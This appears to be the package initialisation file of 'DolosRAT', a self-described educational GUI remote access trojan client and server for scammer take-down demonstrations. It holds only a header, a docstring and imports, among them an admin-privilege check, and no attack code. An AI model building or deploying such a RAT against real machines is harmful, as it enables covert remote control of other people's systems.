# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 06/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

from .misc.logger import LoggerWrapper, LoggerLevel, get_logger
from .net.interface import IfaWrapper, Ifa, get_ifa_wrapper
from .misc.os import check_admin_privs
from .misc.wrapper import BaseWrapper